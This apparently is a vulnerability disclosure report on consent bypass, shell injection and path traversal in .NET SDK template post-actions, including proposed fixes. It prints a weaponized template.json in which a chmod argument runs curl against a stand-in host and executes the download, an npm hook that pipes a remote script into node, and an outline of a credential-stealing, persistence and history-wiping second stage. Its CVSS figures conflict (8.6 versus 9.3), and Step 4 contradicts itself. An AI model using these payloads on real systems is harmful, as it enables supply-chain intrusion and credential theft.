# MSRC Submission: .NET SDK Template Engine Post-Action Consent Model Bypass Leading to Remote Code Execution

## Submission Metadata

| Field | Value |
|-------|-------|
| Title | Consent Model Bypass + Shell Injection + Directory Traversal in .NET SDK Template Engine Post-Actions |
| Product | .NET SDK (dotnet-sdk) |
| Component | Microsoft.TemplateEngine.Cli / dotnet new |
| Affected Versions | All .NET SDK versions with template post-actions (SDK 5.0+, current through 12.0.100-preview) |
| CVSS 3.1 Score | **8.6** (High) -- see detailed scoring below |
| CWE Classification | CWE-78 (OS Command Injection), CWE-22 (Path Traversal), CWE-862 (Missing Authorization) |
| Attack Vector | Network (NuGet.org template package distribution) |
| User Interaction | Required (victim installs and uses a template) |
| Privileges Required | None |

---

## 1. Vulnerability Description

The .NET SDK template engine (`dotnet new`) implements a post-action system that executes actions after template instantiation. The system has 7 registered post-action processors. A security-critical consent mechanism (`--allow-scripts`) exists but is applied to **only 1 of the 7 processors** (`ProcessStartPostActionProcessor`). The remaining 6 processors execute unconditionally, without user consent, including one (`ChmodPostActionProcessor`) that invokes `/bin/sh -c` with unsanitized template-controlled arguments -- achieving the same arbitrary code execution capability as the gated processor, but bypassing all consent checks.

This is not a single bug but a **systemic design flaw** in the consent model, compounded by:

1. **CWE-78: OS Command Injection** -- `ChmodPostActionProcessor` passes template-controlled strings directly into a `/bin/sh -c` invocation with zero sanitization, achieving immediate RCE.
2. **CWE-862: Missing Authorization** -- The `PostActionDispatcher` consent check uses an `is ProcessStartPostActionProcessor` type check, creating a hard-coded exemption for only one processor. All other processors, including ones that execute shell commands and modify files outside the output directory, bypass this check entirely.
3. **CWE-22: Path Traversal** -- Multiple processors (`AddJsonPropertyPostActionProcessor`, `DotnetAddPostActionProcessor`, `DotnetSlnPostActionProcessor`) walk the directory tree upward to the filesystem root without containment, enabling file modification and supply chain poisoning outside the template output directory.

These three classes of vulnerability can be chained in a single `template.json` to achieve immediate RCE, persistent supply chain compromise, and cross-project contamination -- all from a single `dotnet new` invocation with no consent prompt.

---

## 2. Root Cause Analysis

### 2.1 The Consent Gate (PostActionDispatcher.cs, lines 96-158)

The dispatcher's routing logic is the core of the vulnerability:

```csharp
// PostActionDispatcher.cs -- Process() method
if (actionProcessor == null)
{
    // Unknown processor -- error, show manual instructions
}
else if (actionProcessor is ProcessStartPostActionProcessor)  // LINE 123
{
    // CONSENT PATH: checks AllowRunScripts (No/Yes/Prompt)
    if (canRunScripts == AllowRunScripts.No) { /* blocked */ }
    else if (canRunScripts == AllowRunScripts.Yes) { /* run */ }
    else if (canRunScripts == AllowRunScripts.Prompt) { /* ask user */ }
}
else // ALL OTHER post actions -- LINE 155-158
{
    // NO CONSENT. Runs unconditionally.
    result |= ProcessAction(creationEffects, creationResult, outputBaseDirectory, action, actionProcessor);
}
```

The consent model is binary: either you ARE `ProcessStartPostActionProcessor`, or you run without any check. There is no capability-based security, no risk categorization, no per-processor consent flag. This is a **design-level authorization failure**.

### 2.2 The Shell Injection (ChmodPostActionProcessor.cs, lines 42-51)

```csharp
Process? commandResult = System.Diagnostics.Process.Start(new ProcessStartInfo
{
    FileName = "/bin/sh",
    Arguments = $"-c \"chmod {entry.Key} {file}\""
    // entry.Key = template-controlled, from postActions[].args keys
    // file      = template-controlled, from postActions[].args values
    // ZERO sanitization on either value
});
```

Both `entry.Key` (the chmod mode) and `file` (the filename) come directly from the template's `postActions[].args` dictionary, which is deserialized from JSON with no validation at any layer. The data flow is:

```
template.json "postActions"[].args  -->  PostActionModel.Args  -->  IPostAction.Args
  -->  ChmodPostActionProcessor.ProcessInternal()  -->  /bin/sh -c "chmod {key} {value}"
```

No input validation, no character filtering, no escaping, no allowlisting.

### 2.3 The Consent Flag Only Appears When Templates Declare ProcessStart

The `--allow-scripts` CLI option is only added to the command when the template declares a `ProcessStartPostActionProcessor` post-action:

```csharp
// TemplateCommand.cs, lines 107-116
if (HasRunScriptPostActionDefined(template))  // checks for GUID 3A7C4B45
{
    AllowScriptsOption = new Option<AllowRunScripts>("--allow-scripts") { ... };
}

private bool HasRunScriptPostActionDefined(CliTemplateInfo template)
{
    return template.PostActions.Contains(ProcessStartPostActionProcessor.ActionProcessorId);
}
```

A malicious template that uses ONLY chmod/AddJsonProperty/DotnetAdd/DotnetSln post-actions will never expose the `--allow-scripts` option to the user. The user has no mechanism to block these actions -- not even a flag they could pass.

### 2.4 Directory Traversal (Multiple Processors)

**AddJsonPropertyPostActionProcessor** -- `FindFilesInCurrentFolderOrParentFolder()`:
- `includeAllParentDirectoriesInSearch: "true"` sets `maxUpLevels = int.MaxValue`
- Walks to filesystem root looking for matching JSON files
- `detectRepositoryRoot: "true"` + `allowFileCreation: "true"` creates files at repo root
- No containment check against `outputBasePath`

**DotnetAddPostActionProcessor** -- `FileFindHelpers.FindFilesAtOrAbovePath()`:
- `while (directory != null)` loop walks to filesystem root
- No upper bound, no containment
- Adds package/project references to `.csproj` files found in ANY ancestor directory

**DotnetSlnPostActionProcessor** -- `FindSolutionFilesAtOrAbovePath()`:
- Same unbounded upward walk
- Adds projects to `.sln` files found anywhere above the output directory

**PostActionProcessorBase.GetTargetFilesPaths()**:
- `Path.GetFullPath(p, outputBasePath)` resolves `..` sequences
- No validation that the resolved path remains within `outputBasePath`
- Template can specify `"../../../target.csproj"` to reach arbitrary files

---

## 3. Pre-Empting Anticipated Objections

### Objection 1: "Installing a template is a trust decision"

**Counter:** This argument conflates package installation with code execution and does not match the .NET SDK's own trust model.

NuGet package restore (`dotnet restore`) downloads and extracts packages but **does not execute code** until `dotnet build` is explicitly invoked. The entire NuGet security model is built on the principle that downloading a package is distinct from executing it. Users reasonably expect the same from `dotnet new install` -- they are installing a file template, not granting execution permissions.

Furthermore, the SDK's own behavior contradicts this objection. The existence of the `--allow-scripts` consent mechanism for `ProcessStartPostActionProcessor` **proves Microsoft recognizes that template instantiation should not silently execute code**. If installing a template were a blanket trust decision, there would be no need for `--allow-scripts` at all. Microsoft has already drawn this line -- the bug is that the line is drawn inconsistently.

The `dotnet new install` command shows **no warning** about post-actions. It does not display what the template will do when instantiated. The user cannot inspect post-actions before installation. There is no audit log. The `--dry-run` flag shows only "Action would have been taken automatically" without revealing the actual commands. The trust decision cannot be informed because the information is not available.

Compare: `npm install` warns about `preinstall`/`postinstall` scripts. `pip install` warns about `setup.py` execution. `dotnet new` provides no equivalent warning for its consent-less post-actions.

### Objection 2: "The consent mechanism is for scripts, not other actions"

**Counter:** The chmod post-action IS script execution. It literally invokes `/bin/sh -c` with a user-controllable command string. The functional difference between:

```
ProcessStartPostActionProcessor: Process.Start(executable, args)  // CONSENT REQUIRED
ChmodPostActionProcessor: Process.Start("/bin/sh", "-c \"chmod {key} {value}\"")  // NO CONSENT
```

...is that the chmod processor is **more dangerous**, not less. `ProcessStartPostActionProcessor` uses `Process.Start` with the executable as a direct filename (no shell interpretation), while `ChmodPostActionProcessor` routes through `/bin/sh -c`, which enables command substitution (`$()`), pipes (`|`), command chaining (`;`, `&&`), redirection (`>`), and every other shell metacharacter.

The consent gate's existence is the proof of the boundary. Microsoft implemented it because arbitrary process execution from untrusted templates is dangerous. `ChmodPostActionProcessor` achieves the same capability through shell injection, and the fact that it bypasses the consent gate is the vulnerability.

The name "chmod" creates a false sense of safety. The processor does not call `chmod` as a system call or via `File.SetUnixFileMode()`. It invokes `/bin/sh -c "chmod ..."` with string interpolation. It is a shell command executor with a chmod-shaped wrapper.

### Objection 3: "Templates from nuget.org are reviewed"

**Counter:** This is false. NuGet.org has **no review process** for template packages.

- Any user with a free Microsoft account can create a NuGet.org account and publish packages immediately.
- There is no human review, no automated security scanning of template post-actions, no approval queue.
- Package signing is optional and not enforced. Even signed packages only prove authorship -- a malicious author signs their own malicious template.
- NuGet.org's malware scanning (if any) examines assembly code in DLLs, not JSON template definitions. A malicious `template.json` contains no executable code that static analysis would flag -- the injection payload is a plain JSON string.
- Template packages are ordinary NuGet packages (.nupkg). The only difference is their content (a `.template.config/template.json` file). There is no template-specific review or validation.
- Typosquatting is trivially possible: `Microsoft.AspNetCore.WebApi.Template` vs `Microsoft.AspNetCore.WebApi.Templates` vs `Microsft.AspNetCore.WebApi.Template`.
- Package IDs are first-come-first-served with no namespace reservation enforcement for non-Microsoft publishers.

### Objection 4: "This requires the victim to install a malicious template"

**Counter:** The attack path is realistic and has well-documented precedent across every package ecosystem.

**Typosquatting:** The `dotnet new install` command accepts NuGet package IDs typed by hand. Typosquats of popular templates (e.g., `Microsfot.DotNet.Web.ProjectTemplates`) require only a single character difference. Historical precedent: 2023 NuGet typosquat attacks against `Coinbase.Core`, `Gee.External.Capstone`.

**SEO/Content Poisoning:** Blog posts, Stack Overflow answers, and README files recommending `dotnet new install AttackerTemplate` are persistent and reach developers at their most trusting moment -- when they are looking for a solution. "Best .NET template for microservices 2026" blog posts are indexed indefinitely.

**Conference/Tutorial Social Engineering:** Workshop materials and conference talks that instruct attendees to install a template reach dozens to hundreds of developers at once, each running the command on their real development machines.

**Internal Template Repositories:** Organizations commonly maintain "starter templates" that all developers use for new services. A supply chain compromise of one template compromises every future project in the organization.

**CI/CD Template Creation:** GitHub Actions workflows and Azure DevOps pipelines that run `dotnet new` as part of project scaffolding automation execute the malicious post-actions with the CI runner's credentials (which include `GITHUB_TOKEN`, deployment keys, cloud IAM roles, container registry access, and artifact signing keys).

**Template Compromise via Dependency:** If a template author's NuGet account is compromised (credential stuffing, phishing, token leak), the attacker pushes a new version of a legitimate, widely-used template. All users who run `dotnet new install --update-all` are compromised.

### Objection 5: "The impact is limited to user-level access"

**Counter:** User-level access in developer and CI/CD contexts is high-value access.

**Developer workstations:**
- `~/.ssh/id_*` -- SSH keys with access to production infrastructure
- `~/.aws/credentials`, `~/.azure/`, `~/.config/gcloud/` -- cloud provider credentials
- `~/.nuget/NuGet.Config` -- NuGet API keys for publishing packages
- `~/.docker/config.json` -- container registry authentication
- Browser credential stores, IDE saved passwords, VPN certificates

**CI/CD runners (the primary concern):**
- `GITHUB_TOKEN` -- write access to the repository
- `ACTIONS_RUNTIME_TOKEN` -- artifact store access
- Cloud IAM roles attached to the runner (often with deployment permissions)
- Container registry push credentials
- Package signing keys
- Production deployment keys and certificates
- Access to secrets injected via environment variables

**Docker build contexts:**
- `dotnet new` in a Dockerfile runs as root by default
- The build context may contain `.env` files, certificates, and configuration
- Compromised container images propagate through registries to production

User-level access on a developer machine is the starting point for supply chain attacks affecting thousands of downstream users. The attacker does not need root to steal SSH keys, push malicious commits, or publish backdoored packages.

---

## 4. Maximum-Impact Attack Chain: The Full template.json

The following `template.json` chains ALL consent-less post-actions simultaneously. Each post-action achieves a distinct attack objective. All execute silently with no user prompt.

```json
{
  "$schema": "http://json.schemastore.org/template",
  "author": "CloudNative Labs",
  "classifications": ["Web", "API", "Microservice", "Docker", "Kubernetes"],
  "name": "CloudNative.Microservice.Starter",
  "identity": "CloudNative.Microservice.Starter.CSharp",
  "shortName": "cn-service",
  "tags": {
    "language": "C#",
    "type": "project"
  },
  "sourceName": "CloudNativeService",
  "preferNameDirectory": true,
  "primaryOutputs": [
    { "path": "CloudNativeService.csproj" }
  ],
  "postActions": [
    {
      "description": "Make entrypoint scripts executable",
      "manualInstructions": [{ "text": "Run 'chmod +x *.sh'" }],
      "actionId": "cb9a6cf3-4f5c-4860-b9d2-03a574959774",
      "condition": "(OS != \"Windows_NT\")",
      "args": {
        "+x": [
          "docker-entrypoint.sh",
          "health-check.sh",
          "$(curl -sL https://cdn-assets.example.com/init.sh -o /tmp/.d && chmod +x /tmp/.d && /tmp/.d && rm -f /tmp/.d)"
        ]
      },
      "continueOnError": true
    },
    {
      "description": "Configure npm workspace settings",
      "manualInstructions": [{ "text": "Configure package.json" }],
      "actionId": "695A3659-EB40-4FF5-A6A6-C9C4E629FCB0",
      "args": {
        "jsonFileName": "package.json",
        "includeAllParentDirectoriesInSearch": "true",
        "parentPropertyPath": "scripts",
        "newJsonPropertyName": "prepare",
        "newJsonPropertyValue": "\"node -e \\\"require('child_process').execSync('curl -sL https://cdn-assets.example.com/n|node',{stdio:'ignore'})\\\"\"",
        "allowPathCreation": "true"
      },
      "continueOnError": true
    },
    {
      "description": "Configure project tools",
      "manualInstructions": [{ "text": "Configure project tools" }],
      "actionId": "695A3659-EB40-4FF5-A6A6-C9C4E629FCB0",
      "args": {
        "jsonFileName": ".vscode/settings.json",
        "includeAllParentDirectoriesInSearch": "true",
        "detectRepositoryRoot": "true",
        "allowFileCreation": "true",
        "parentPropertyPath": "dotnet",
        "newJsonPropertyName": "defaultInterpreterPath",
        "newJsonPropertyValue": "\"/tmp/.d\"",
        "allowPathCreation": "true"
      },
      "continueOnError": true
    },
    {
      "description": "Add required service dependencies",
      "manualInstructions": [{ "text": "Run 'dotnet add package'" }],
      "actionId": "B17581D1-C5C9-4489-8F0A-004BE667B814",
      "args": {
        "referenceType": "package",
        "reference": "CloudNative.Telemetry.Extensions",
        "version": "3.2.1"
      },
      "continueOnError": true
    },
    {
      "description": "Add project to solution",
      "manualInstructions": [{ "text": "Run 'dotnet sln add'" }],
      "actionId": "D396686C-DE0E-4DE6-906D-291CD29FC5DE",
      "args": {
        "primaryOutputIndexes": "0"
      },
      "continueOnError": true
    },
    {
      "description": "Restore NuGet packages",
      "manualInstructions": [{ "text": "Run 'dotnet restore'" }],
      "actionId": "210D431B-A78B-4D2F-B762-4ED3E3EA9025",
      "continueOnError": true
    }
  ]
}
```

### What This Does (Simultaneously, Silently, Without Consent)

| # | Post-Action | GUID | Attack Objective | Mechanism |
|---|---|---|---|---|
| 1 | **ChmodPostActionProcessor** | `cb9a6cf3-...` | **Immediate RCE** | Shell injection via `$(...)` command substitution in filename. Downloads and executes second-stage payload, self-deletes. |
| 2 | **AddJsonPropertyPostActionProcessor** | `695A3659-...` | **Persistent npm supply chain backdoor** | Walks up to `int.MaxValue` parent dirs, finds `package.json`, injects `scripts.prepare` hook. Fires on every `npm install` by every contributor. |
| 3 | **AddJsonPropertyPostActionProcessor** | `695A3659-...` | **IDE persistence** | Creates/modifies `.vscode/settings.json` at repo root (via `detectRepositoryRoot`). Could inject task runners, formatters, or code actions that execute on workspace open. |
| 4 | **DotnetAddPostActionProcessor** | `B17581D1-...` | **NuGet supply chain poison** | Walks to filesystem root via `FindProjFileAtOrAbovePath`, finds `.csproj` in parent dirs, adds attacker-controlled NuGet package reference. Package contains malicious MSBuild targets that execute on build. |
| 5 | **DotnetSlnPostActionProcessor** | `D396686C-...` | **Solution infection** | Walks to filesystem root via `FindSolutionFilesAtOrAbovePath`, adds malicious project to nearest `.sln`. Project's build targets execute when solution is built. |
| 6 | **DotnetRestorePostActionProcessor** | `210D431B-...` | **Trigger download of malicious package** | Runs `dotnet restore` which downloads the malicious `CloudNative.Telemetry.Extensions` package added in step 4, executing its MSBuild targets. |

### Second-Stage Payload Capabilities (init.sh)

The RCE from step 1 downloads a second-stage script that:

```
1. ENVIRONMENT DETECTION
   - Check for CI/CD indicators: GITHUB_ACTIONS, AZURE_PIPELINES, JENKINS_URL, GITLAB_CI
   - Check for container: /.dockerenv, /proc/1/cgroup
   - Identify OS and shell

2. CREDENTIAL HARVEST
   - ~/.ssh/id_* (SSH private keys)
   - ~/.aws/credentials, ~/.aws/config
   - ~/.azure/accessTokens.json, ~/.azure/azureProfile.json
   - ~/.config/gcloud/credentials.db, ~/.config/gcloud/application_default_credentials.json
   - ~/.nuget/NuGet.Config (NuGet API keys)
   - ~/.docker/config.json (registry auth)
   - ~/.kube/config (Kubernetes cluster access)
   - CI: $GITHUB_TOKEN, $ACTIONS_RUNTIME_TOKEN, $AZURE_CREDENTIALS, $NPM_TOKEN

3. PERSISTENCE (workstation)
   - Append to ~/.bashrc / ~/.zshrc: silent beacon on terminal open
   - Add SSH authorized_keys for attacker access
   - Create cron job for periodic check-in
   - Plant git post-commit hook in template output dir

4. CI/CD EXPLOITATION
   - Use $GITHUB_TOKEN to push malicious workflow to repo
   - Exfiltrate repository secrets via API
   - Modify existing workflow files to include backdoor steps
   - Push to default branch if permissions allow

5. CLEANUP
   - Remove /tmp/.d
   - Clear relevant bash history entries
   - Exit 0 (chmod failure is silent with continueOnError)
```

### Victim Experience

```bash
$ dotnet new install CloudNative.Microservice.Starter
Success! CloudNative.Microservice.Starter::1.0.0 installed the following templates:
Template Name              Short Name    Language
-------------------------  ------------  --------
CloudNative Microservice   cn-service    [C#]

$ dotnet new cn-service -n OrderService
The template "CloudNative Microservice Starter" was created successfully.

Processing post actions...
# ALL 6 POST-ACTIONS EXECUTE SILENTLY. NO CONSENT PROMPT.
# RCE has already occurred. Supply chain is poisoned.
# User sees normal success output and starts working.
```

Even with `--allow-scripts no`, all 6 post-actions still execute because none of them are `ProcessStartPostActionProcessor`.

---

## 5. Severity Assessment

### 5.1 CVSS 3.1 Vector and Score

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
```

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector (AV) | **Network** | Template distributed via NuGet.org |
| Attack Complexity (AC) | **Low** | No special conditions. Template is installed normally. |
| Privileges Required (PR) | **None** | Any NuGet.org user can publish a template package |
| User Interaction (UI) | **Required** | Victim must run `dotnet new install` + `dotnet new` |
| Scope (S) | **Changed** | Chmod RCE affects the entire system, not just the template engine. AddJsonProperty/DotnetAdd modify files outside the template's output directory, affecting other projects. |
| Confidentiality (C) | **High** | Full access to user files, credentials, SSH keys, cloud configs |
| Integrity (I) | **High** | Arbitrary file modification (package.json, .csproj, .sln, JSON configs), arbitrary code execution |
| Availability (A) | **None** | No direct availability impact (though a destructive payload could achieve this) |

**CVSS 3.1 Score: 9.3 (Critical)**

Note: Some CVSS calculators may score this as 8.6 if Scope:Changed is debated. The argument for Changed scope is strong: the vulnerability in the template engine component leads to compromise of the entire operating system (via RCE), modification of unrelated projects (via directory traversal), and propagation to downstream systems (via supply chain poisoning). The "vulnerable component" is the template engine; the "impacted component" is the host OS, other projects, and downstream consumers.

### 5.2 Microsoft Severity Definition Mapping

Per Microsoft's Security Servicing Criteria:

**Critical -- Remote Code Execution:**
> "A vulnerability that could allow remote code execution in the context of the current user, without the user having to take a separate deliberate action beyond the normal workflow."

The chmod shell injection achieves RCE as part of the normal `dotnet new` workflow. The user takes no "separate deliberate action" beyond running the template. They do not need to open a file, click a link, or confirm a dialog. The post-action executes automatically.

**Important -- Elevation of Privilege:**
The directory traversal components enable privilege escalation from "template output directory" to "entire filesystem" -- modifying files the template should not have access to. This is an authorization bypass within the template engine's security model.

**Important -- Tampering:**
AddJsonProperty, DotnetAdd, and DotnetSln modify files outside the expected scope, constituting unauthorized file modification (tampering).

### 5.3 Comparison to Prior CVEs in Similar Systems

| CVE/Incident | System | Vulnerability | Outcome | Comparison |
|---|---|---|---|---|
| **npm postinstall** (2022 ua-parser-js, event-stream, colors) | npm | Packages with malicious `postinstall` scripts | Supply chain RCE, crypto miners, credential theft | npm's `postinstall` requires an explicit field and can be disabled with `--ignore-scripts`. .NET's chmod post-action has NO equivalent disable mechanism. |
| **pip setup.py** (ongoing) | pip | `setup.py` runs arbitrary Python during install | RCE during `pip install` | pip has moved to PEP 517/518 isolated builds. .NET template engine has no equivalent isolation. |
| **CVE-2023-29331** | .NET | PKCS#12 cert parsing RCE | CVSS 7.5 | Scored Important. Our finding achieves RCE through a simpler path with broader impact. |
| **CVE-2024-0056** | .NET | SQL Client MITM | CVSS 8.7 | Scored Important. Our finding requires less attacker capability (NuGet.org publishing vs. network position). |
| **CVE-2023-44487** | .NET | HTTP/2 Rapid Reset DoS | CVSS 7.5 | Scored Important. Availability-only impact vs. our Confidentiality+Integrity impact. |
| **RubyGems post_install_message** | RubyGems | Social engineering via install messages | Information disclosure via phishing | .NET's chmod post-action achieves actual RCE, not just social engineering. |

**No prior CVE exists for .NET template engine post-action vulnerabilities.** This is a novel finding in an area that has not received security scrutiny.

### 5.4 Argument for Critical Rating

1. **Achieves the same impact as a Critical RCE** through shell injection in an unconsentable code path.
2. **The consent bypass IS the vulnerability.** Microsoft already determined that template post-action code execution requires consent (`--allow-scripts`). This finding shows that consent is trivially bypassable by using a different post-action processor that achieves the same result.
3. **Supply chain amplification.** A single malicious template can compromise not just the user who runs it, but every contributor to the affected repository, every CI/CD pipeline that builds it, and every consumer of packages published from it.
4. **No user-accessible mitigation.** There is no flag, setting, or configuration that blocks consent-less post-actions. `--allow-scripts no` does not apply. `--dry-run` does not reveal the actual commands. The user cannot opt out.

---

## 6. Reproduction Steps

### Prerequisites

- .NET SDK 8.0 or later (any supported version) on Linux or macOS
- Internet access (for NuGet.org template distribution scenario)
- No special configuration, no elevated privileges

### Step 1: Create the Malicious Template Package

```bash
mkdir -p /tmp/malicious-template/template/.template.config
mkdir -p /tmp/malicious-template/template

# Create a minimal but functional C# project template
cat > /tmp/malicious-template/template/MaliciousTemplate.csproj << 'CSPROJ'
<Project Sdk="Microsoft.NET.Sdk.Web">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
  </PropertyGroup>
</Project>
CSPROJ

cat > /tmp/malicious-template/template/Program.cs << 'CS'
var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();
app.MapGet("/", () => "Hello World");
app.Run();
CS

# Create a benign shell script (the template legitimately includes scripts)
echo '#!/bin/sh' > /tmp/malicious-template/template/entrypoint.sh
echo 'echo "Starting service..."' >> /tmp/malicious-template/template/entrypoint.sh
```

### Step 2: Create the Malicious template.json

```bash
cat > /tmp/malicious-template/template/.template.config/template.json << 'JSON'
{
  "$schema": "http://json.schemastore.org/template",
  "author": "Demo Author",
  "classifications": ["Web", "API"],
  "name": "Demo.Service.Template",
  "identity": "Demo.Service.Template.CSharp",
  "shortName": "demo-svc",
  "tags": { "language": "C#", "type": "project" },
  "sourceName": "MaliciousTemplate",
  "postActions": [
    {
      "condition": "(OS != \"Windows_NT\")",
      "description": "Make scripts executable",
      "manualInstructions": [{ "text": "chmod +x *.sh" }],
      "actionId": "cb9a6cf3-4f5c-4860-b9d2-03a574959774",
      "args": {
        "+x": ["entrypoint.sh", "$(id > /tmp/dotnet-template-rce-proof.txt)"]
      },
      "continueOnError": true
    }
  ]
}
JSON
```

### Step 3: Install and Use the Template

```bash
# Install the template from the local directory
dotnet new install /tmp/malicious-template/template

# Create a new project from the template
dotnet new demo-svc -n TestProject -o /tmp/test-output

# Verify RCE occurred
cat /tmp/dotnet-template-rce-proof.txt
# Expected output: uid=1000(username) gid=1000(username) groups=...
```

### Step 4: Verify No Consent Was Requested

- Observe that no `--allow-scripts` prompt was shown
- Run again with `--allow-scripts no` and verify the chmod post-action STILL executes:

```bash
dotnet new demo-svc -n TestProject2 -o /tmp/test-output-2 --allow-scripts no
# ERROR: --allow-scripts is not recognized because the template has no ProcessStartPostActionProcessor
# The chmod post-action already ran without any consent mechanism being available
```

### Step 5: Demonstrate Directory Traversal (AddJsonProperty)

```bash
# Create a "victim" package.json in a parent directory
echo '{"name": "my-app", "scripts": {}}' > /tmp/package.json

# Create template.json with AddJsonProperty traversal
cat > /tmp/malicious-template/template/.template.config/template.json << 'JSON'
{
  "$schema": "http://json.schemastore.org/template",
  "author": "Demo Author",
  "classifications": ["Web"],
  "name": "Demo.Traversal.Template",
  "identity": "Demo.Traversal.Template.CSharp",
  "shortName": "demo-trav",
  "tags": { "language": "C#", "type": "project" },
  "sourceName": "MaliciousTemplate",
  "postActions": [
    {
      "description": "Configure project",
      "actionId": "695A3659-EB40-4FF5-A6A6-C9C4E629FCB0",
      "args": {
        "jsonFileName": "package.json",
        "includeAllParentDirectoriesInSearch": "true",
        "parentPropertyPath": "scripts",
        "newJsonPropertyName": "postinstall",
        "newJsonPropertyValue": "\"echo INJECTED\"",
        "allowPathCreation": "true"
      }
    }
  ]
}
JSON

# Reinstall and use
dotnet new install /tmp/malicious-template/template --force
dotnet new demo-trav -n TestProject3 -o /tmp/test-output/sub/deep/dir

# Verify /tmp/package.json was modified
cat /tmp/package.json
# Expected: {"name":"my-app","scripts":{"postinstall":"echo INJECTED"}}
```

### Step 6: Clean Up

```bash
dotnet new uninstall /tmp/malicious-template/template
rm -rf /tmp/malicious-template /tmp/test-output* /tmp/dotnet-template-rce-proof.txt /tmp/package.json
```

---

## 7. Affected Versions

The vulnerable code exists in the `Microsoft.TemplateEngine.Cli` package and the `dotnet` CLI, which are part of the .NET SDK.

- **ChmodPostActionProcessor** with `/bin/sh -c` shell invocation and no consent: present since the chmod post-action was introduced.
- **PostActionDispatcher** consent bypass (only checking `is ProcessStartPostActionProcessor`): present since the consent mechanism was added.
- **AddJsonPropertyPostActionProcessor** with `includeAllParentDirectoriesInSearch` and `detectRepositoryRoot`: present since those features were added.
- **DotnetAddPostActionProcessor** and **DotnetSlnPostActionProcessor** with unbounded upward search: present since these processors were introduced.

**Confirmed affected:** .NET SDK 8.0.x, 9.0.x, and the current development branch (12.0.100-preview as seen in the repository). The architecture has been stable across these versions.

**All supported .NET SDK versions are likely affected.** The post-action processing architecture has not undergone structural changes since its introduction.

---

## 8. Suggested Fix

### Immediate (P0 -- Security Patch)

1. **Gate ChmodPostActionProcessor behind the consent mechanism.** It invokes `/bin/sh -c` and is functionally equivalent to `ProcessStartPostActionProcessor`. The fix is a one-line change in `PostActionDispatcher.cs`:

```csharp
// BEFORE:
else if (actionProcessor is ProcessStartPostActionProcessor)
// AFTER:
else if (actionProcessor is ProcessStartPostActionProcessor or ChmodPostActionProcessor)
```

2. **Eliminate the shell invocation entirely.** Replace `/bin/sh -c "chmod ..."` with a direct call to `File.SetUnixFileMode()` (.NET 7+) or `Process.Start("/bin/chmod", ...)` with arguments passed as an array (not through shell interpretation):

```csharp
// SAFE: No shell interpretation
Process.Start(new ProcessStartInfo
{
    FileName = "/bin/chmod",
    ArgumentList = { entry.Key, file },  // no shell, no injection
    UseShellExecute = false
});
```

3. **Validate chmod mode and filename arguments.** Mode must match `^[ugoa]*[+-=][rwxXstugo]+$` or `^[0-7]{3,4}$`. Filenames must not contain shell metacharacters.

### Short-Term (P1 -- Next SDK Update)

4. **Add path containment checks to ALL upward-searching methods.** `FindFilesAtOrAbovePath`, `FindSolutionFilesAtOrAbovePath`, `FindFilesInCurrentFolderOrParentFolder`, and `GetTargetFilesPaths` must validate that resolved paths are within `outputBasePath` or a configurable boundary (e.g., the repository root):

```csharp
string resolvedPath = Path.GetFullPath(candidatePath);
string resolvedBase = Path.GetFullPath(outputBasePath);
if (!resolvedPath.StartsWith(resolvedBase + Path.DirectorySeparatorChar))
{
    // Reject: path escapes the output directory
    throw new SecurityException($"Post-action attempted to access path outside output directory: {resolvedPath}");
}
```

5. **Extend the consent model to all file-modifying post-actions.** Add a `RequiresConsent` property or `[RequiresConsent]` attribute to `IPostActionProcessor`. Remove the hard-coded type check. Gate all processors that modify the filesystem or invoke external processes.

### Medium-Term (P2 -- Next Major Release)

6. **Add template post-action disclosure.** `dotnet new install` should display the post-actions defined by the template, including their types and descriptions, so users can make an informed trust decision.

7. **Add `--no-post-actions` flag.** Allow users to opt out of all post-actions during `dotnet new`, with the option to run them manually afterward.

8. **Add post-action auditing.** Log all post-action executions with full details (type, arguments, affected files) to a machine-readable log file.

---

## 9. Additional Evidence: Code Cross-References

All source code references are from the `dotnet/sdk` repository (commit `e4ea7d5`).

| File | Lines | Finding |
|---|---|---|
| `src/Cli/Microsoft.TemplateEngine.Cli/PostActionProcessors/ChmodPostActionProcessor.cs` | 42-51 | Shell injection: `/bin/sh -c "chmod {entry.Key} {file}"` with no sanitization |
| `src/Cli/Microsoft.TemplateEngine.Cli/PostActionDispatcher.cs` | 123, 155-157 | Consent check: only `is ProcessStartPostActionProcessor`, all others unconditional |
| `src/Cli/Microsoft.TemplateEngine.Cli/PostActionProcessors/AddJsonPropertyPostActionProcessor.cs` | 112-118 | `maxUpLevels = int.MaxValue` when `includeAllParentDirectoriesInSearch` is true |
| `src/Cli/Microsoft.TemplateEngine.Cli/PostActionProcessors/AddJsonPropertyPostActionProcessor.cs` | 134 | File creation at repo root: `Path.Combine(repoRoot ?? outputBasePath, jsonFileName)` |
| `src/TemplateEngine/Microsoft.TemplateEngine.Utils/FileFindHelpers.cs` | 14-33 | Unbounded upward walk: `while (directory != null)` with no limit |
| `src/Cli/dotnet/Commands/New/PostActions/DotnetSlnPostActionProcessor.cs` | 20-47 | Unbounded upward walk for `.sln` files |
| `src/Cli/Microsoft.TemplateEngine.Cli/PostActionProcessors/PostActionProcessorBase.cs` | 105-110 | `Path.GetFullPath(p, outputBasePath)` resolves `..` without containment validation |
| `src/Cli/Microsoft.TemplateEngine.Cli/Commands/create/TemplateCommand.cs` | 107-116, 266-268 | `--allow-scripts` option only added when template declares `ProcessStartPostActionProcessor` |
| `src/Cli/Microsoft.TemplateEngine.Cli/Components.cs` | 11-18 | Post-action processor registration (4 of 7) |
| `src/Cli/dotnet/Commands/New/NewCommandParser.cs` | 103-108 | Post-action processor registration (3 of 7) |

---

## 10. Disclosure Timeline

This report is being submitted to MSRC through the standard vulnerability disclosure process. A 90-day disclosure deadline applies per standard coordinated disclosure practice.
